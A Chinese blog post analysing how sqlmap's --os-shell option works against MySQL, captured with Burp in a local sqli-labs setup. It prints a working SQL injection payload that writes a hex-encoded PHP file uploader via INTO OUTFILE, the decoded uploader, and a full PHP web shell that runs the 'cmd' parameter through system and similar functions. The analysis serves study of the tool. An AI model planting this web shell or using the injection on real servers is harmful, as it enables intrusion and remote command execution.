{"blogid": "124154956", "writerAge": "码龄1年", "writerBlogNum": "35", "writerCollect": "80", "writerComment": "5", "writerFan": "31", "writerGrade": "3级", "writerIntegral": "401", "writerName": "ZredamanJ", "writerProfileAdress": "writer_image\\profile_124154956.jpg", "writerRankTotal": "51932", "writerRankWeekly": "89025", "writerThumb": "43", "writerVisitNum": "66570", "blog_read_count": "7360", "blog_time": "已于 2022-05-10 16:41:00 修改", "blog_title": "sqlmap --os-shell 原理详解", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<h1>os-shell 执行原理</h1>\n<p>对于mysql数据库来说，--os-shell的本质就是写入两个php文件，其中的tmpugvzq.php可以让我们上传文件到网站路径下，如下图。</p>\n<p><img alt=\"\" height=\"406\" src=\"image\\9ace4e3d7c084e95a7f601dff80a5239.png\" width=\"1200\"/></p>\n<p></p>\n<p></p>\n<p>然后sqlmap就会通过上面这个php上传一个用于命令执行的tmpbylqf.php到网站路径下，让我们命令执行，并将输出的内容返回sqlmap端。</p>\n<p><strong>这是单看tmpbylqf.php的执行效果：</strong></p>\n<p><img alt=\"\" height=\"365\" src=\"image\\e7acf0fe770943919ae9b082101c39e5.png\" width=\"1200\"/></p>\n<p></p>\n<p></p>\n<p></p>\n<h1>过程演示</h1>\n<blockquote>\n<p>本次实验环境是本机上搭建的sqli-libs，目的为了研究--os-shell的原理，所以假设我们已知网站绝对路径且利用条件符合。</p>\n</blockquote>\n<p>--os-shell的利用条件</p>\n<blockquote>\n<ul><li id=\"u6e5eb800\">知道网站的物理路径</li><li id=\"u25fe7878\">高权限数据库用户</li><li id=\"ua2952283\">secure_file_priv无限制</li><li id=\"u2ef422b3\">网站路径有写入权限</li></ul>\n</blockquote>\n<p></p>\n<p>首先打开bp，并设置为拦截状态</p>\n<p><img alt=\"\" height=\"400\" src=\"image\\9e05a84534fd4d919785a3d6820a4a24.png\" width=\"1200\"/></p>\n<p>接着打开sqlmap执行--os-shell，并将代理设置为本地的8080端口，目的是在bp中抓取sqlmap发送的数据包进行分析。</p>\n<pre><code>python sqlmap.py -u http://127.0.0.1/sqli-master/Less-1?id=1  --os-shell --proxy=http://127.0.0.1:8080</code></pre>\n<p></p>\n<p>在抓到第一个数据包后关闭拦截，后续sqlmap发送的数据包都会在bp的http历史记录里都有数据。</p>\n<p><img alt=\"\" height=\"340\" src=\"image\\945f00b85cf949e0a019264e456997c9.png\" width=\"1200\"/></p>\n<p></p>\n<p>接着回到sqlmap里面进行选择参数</p>\n<p><img alt=\"\" height=\"400\" src=\"image\\4dc0a8d2e2a84e9e977894373be1d75d.png\" width=\"964\"/></p>\n<p>选择php语言</p>\n<p><img alt=\"\" height=\"218\" src=\"image\\b48107c5a50b49aeb4f8ec3fec12321a.png\" width=\"961\"/></p>\n<p> 接着这个参数是选择绝对路径</p>\n<p><img alt=\"\" height=\"243\" src=\"image\\d86d866a79a249aabe27008e5b1189ac.png\" width=\"962\"/></p>\n<blockquote>\n<p>选项一为用这几个路径</p>\n<p>选项二为用户自己输入</p>\n<p>选项三为用用户的字典</p>\n<p>选项四为爆破。</p>\n</blockquote>\n<p> 我们选择2，去phpstudy的sqli第一关目录下复制路径</p>\n<p><img alt=\"\" height=\"254\" src=\"image\\35259b3a4e104b759e2959b088967edc.png\" width=\"781\"/></p>\n<p> <img alt=\"\" height=\"214\" src=\"image\\8ee41719683347c0bbab549cea1a715e.png\" width=\"952\"/></p>\n<p>到这就完成了--os-shell的执行，来看看在sqlmap的执行效果</p>\n<p><img alt=\"\" height=\"215\" src=\"image\\875c1ec8f88b4bd9a9b8e67ba3fe58f4.png\" width=\"963\"/></p>\n<p></p>\n<p>执行完整个--os-shell过程，在bp的http历史记录中也抓到了全部数据包，下面对数据包进行分析。</p>\n<p><img alt=\"\" height=\"374\" src=\"image\\da7d00d0a20c4e90b276ed98264a9397.png\" width=\"1200\"/></p>\n<p></p>\n<p>前六个数据包都是普通的sql注入测试，没什么用，直接点开第七个数据包。</p>\n<p><img alt=\"\" height=\"611\" src=\"image\\d3dc448767d54f76ad2a124047c118d7.png\" width=\"1200\"/></p>\n<p></p>\n<p> 把id后面那一大串url编码的东西拿去解码一下</p>\n<p><img alt=\"\" height=\"600\" src=\"image\\2db65bd72f1543fb8424b5e8a527fe93.png\" width=\"1200\"/></p>\n<p></p>\n<p>url解码后的语句：</p>\n<blockquote>\n<p>-5906' OR 2054=2054 LIMIT 0,1 INTO OUTFILE 'C:/Users/zhang/Desktop/php/PHPTutorial/WWW/sqli-master/Less-1/tmpugvzq.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d433a5c5c55736572735c5c7a68616e675c5c4465736b746f705c5c7068705c5c5048505475746f7269616c5c5c5757575c5c73716c692d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a</p>\n</blockquote>\n<p><img alt=\"\" height=\"336\" src=\"image\\63954d9666c44b36aeb6e13412d42baf.png\" width=\"1200\"/></p>\n<p>发现LINES TERMINATED BY后面还有一段ascll的十六进制数，继续解码得到下面的php代码，也就是文章开头说的tmpugvzq.php，用于上传后面的命令执行文件。</p>\n<blockquote>\n<p>0x&lt;?php<br/> if (isset($_REQUEST[\"upload\"])){$dir=$_REQUEST[\"uploadDir\"];if (phpversion()&lt;'4.1.0'){$file=$HTTP_POST_FILES[\"file\"][\"name\"];@move_uploaded_file($HTTP_POST_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();}else{$file=$_FILES[\"file\"][\"name\"];@move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();}@chmod($dir.\"/\".$file,0755);echo \"File uploaded\";}else {echo \"&lt;form action=\".$_SERVER[\"PHP_SELF\"].\" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\\\Users\\\\zhang\\\\Desktop\\\\php\\\\PHPTutorial\\\\WWW\\\\sqli-master\\\\Less-1\\\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;\";}?&gt;<br/>  </p>\n</blockquote>\n<p><img alt=\"\" height=\"362\" src=\"image\\e3b061f3e05a4185b646aee26075e634.png\" width=\"1200\"/></p>\n<p>这是整理后的代码</p>\n<pre><code>0x&lt;?php\nif (isset($_REQUEST[\"upload\"])){\n\t$dir=$_REQUEST[\"uploadDir\"];\n\tif (phpversion()&lt;'4.1.0')\n\t\t{\n\t\t\t$file=$HTTP_POST_FILES[\"file\"][\"name\"];\n\t\t\t@move_uploaded_file($HTTP_POST_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();\n\t\t}\n\t\telse{\n\t\t\t$file=$_FILES[\"file\"][\"name\"];\n\t\t\t@move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$dir.\"/\".$file) or die();\n\t\t}\n\t\t@chmod($dir.\"/\".$file,0755);\n\t\techo \"File uploaded\";\n\t}\n\telse \n\t\t{\n\t\t\techo \"&lt;form action=\".$_SERVER[\"PHP_SELF\"].\" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=C:\\\\Users\\\\zhang\\\\Desktop\\\\php\\\\PHPTutorial\\\\WWW\\\\sqli-master\\\\Less-1\\\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;\";\n\t\t}\n?&gt;\n</code></pre>\n<p></p>\n<p>根据上面的mysql语句，不难看出这是利用into outfile ....LINES TERMINATED BY语句写个用于上传文件的tmpugvzq.php，语法为：</p>\n<pre><code>into outfile '网站路径/tmpugvzq.php' LINES TERMINATED BY 'aaa'</code></pre>\n<blockquote>\n<p><br/> LINES TERMINATED BY表示每行以  'aaa'结束</p>\n</blockquote>\n<p>实例：</p>\n<pre><code>select 1 into outfile 'C:/Users/***/Desktop/php/PHPTutorial/WWW/info.php' lines terminated by 'aaa';</code></pre>\n<p><img alt=\"\" height=\"80\" src=\"image\\2b64d4a449664ef5a3fe37186b51425b.png\" width=\"967\"/></p>\n<p><img alt=\"\" height=\"567\" src=\"image\\45a90a70c4ab49908ff6df40f80cb68f.png\" width=\"1200\"/></p>\n<p></p>\n<p> 继续对数据包进行分析，第七个到十六个中间的数据包都是无用的，看到第十六个数据包</p>\n<p><img alt=\"\" height=\"698\" src=\"image\\1ed3df433ae147148e80c9c3c711ebd1.png\" width=\"1200\"/></p>\n<p></p>\n<p> 不难看出这是通过POST方法上传了一个tmpbylqf.php，文件的内容经过整理后为</p>\n<pre><code>&lt;?php \n$c=$_REQUEST[\"cmd\"];\n@set_time_limit(0);\n@ignore_user_abort(1);\n@ini_set(\"max_execution_time\",0);\n$z=@ini_get(\"disable_functions\");\nif(!empty($z))\n    {\n        $z=preg_replace(\"/[, ]+/\",',',$z);\n        $z=explode(',',$z);\n        $z=array_map(\"trim\",$z);\n    }\nelse\n    {\n        $z=array();\n    }\n    $c=$c.\" 2&gt;&amp;1\\n\";\nfunction f($n)\n{\n    global $z;return is_callable($n)and!in_array($n,$z);\n}\nif(f(\"system\")){\n    ob_start();\n    system($c);\n    $w=ob_get_clean();\n}\nelseif(f(\"proc_open\")){\n    $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);\n    $w=NULL;\n    while(!feof($t[1])){\n        $w.=fread($t[1],512);\n    }\n    @proc_close($y);\n}\nelseif(f(\"shell_exec\")){\n    $w=shell_exec($c);\n}\nelseif(f(\"passthru\")){\n    ob_start();\n    passthru($c);\n    $w=ob_get_clean();\n}\nelseif(f(\"popen\")){\n    $x=popen($c,r);\n    $w=NULL;\n    if(is_resource($x)){\n        while(!feof($x))\n            {\n                $w.=fread($x,512);\n            }\n        }\n        @pclose($x);\n    }\n    elseif(f(\"exec\")){\n        $w=array();\n        exec($c,$w);\n        $w=join(chr(10),$w).chr(10);\n    }\n    else{\n        $w=0;\n    }\n    echo\"&lt;pre&gt;$w&lt;/pre&gt;\";?&gt;</code></pre>\n<p>这是一个用于命令执行的代码，命令执行后会将执行的结果输出。最后剩下第17、18个数据包，就是我们刚刚在sqlmap输入whoami发送的数据包，这里不在进行分析了。</p>\n<p></p>\n<p>数据包分析完毕，最后我们可以在sqli-master/Less-1目录下找到生成的两个后门文件。</p>\n<p><img alt=\"\" height=\"315\" src=\"image\\38654571e9f6412c8a6e3b357ec9e1d0.png\" width=\"1157\"/></p>\n<p></p>\n<h1>总结</h1>\n<p>sqlmap的--os-shell在mysql数据库中的原理，其实就是往服务器上写入了两个php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页url中通过对cmd参数传参执行系统命令。</p>\n</div>\n</div>"}